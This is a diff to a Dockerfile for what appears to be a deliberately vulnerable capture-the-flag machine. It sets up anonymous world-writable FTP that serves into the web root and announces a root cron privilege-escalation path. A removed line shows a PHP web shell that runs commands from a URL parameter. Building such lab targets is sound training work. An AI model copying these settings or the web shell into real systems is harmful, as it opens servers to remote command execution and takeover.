@@ -14,17 +14,22 @@ RUN mkdir -p /root && echo "unclaimed" > /root/king.txt && chmod 666 /root/king.
 
 # FTP setup - anonymous allowed, writable to web root
 RUN mkdir -p /var/ftp/pub && \
-    chown -R ftp:ftp /var/ftp && \
+    mkdir -p /var/run/vsftpd/empty && \
+    chown root:root /var/ftp && \
+    chmod 755 /var/ftp && \
+    chown ftp:ftp /var/ftp/pub && \
     chmod 777 /var/ftp/pub && \
-    ln -s /var/www/html /var/ftp/pub/webroot
+    mkdir -p /var/ftp/pub/webroot && \
+    chmod 777 /var/ftp/pub/webroot && \
+    rm -rf /var/www/html && \
+    ln -s /var/ftp/pub/webroot /var/www/html
 
 # vsftpd config - anonymous with write
 COPY vsftpd.conf /etc/vsftpd.conf
 
 # Apache setup
-RUN echo "<?php if(isset(\$_GET['cmd'])){system(\$_GET['cmd']);}?>" > /var/www/html/info.php
 RUN chmod 777 /var/www/html
-RUN chown -R www-data:www-data /var/www/html
+RUN chown -R www-data:www-data /var/ftp/pub/webroot
 
 # PrivEsc: World-writable script run by root cron
 RUN mkdir -p /opt/scripts && \
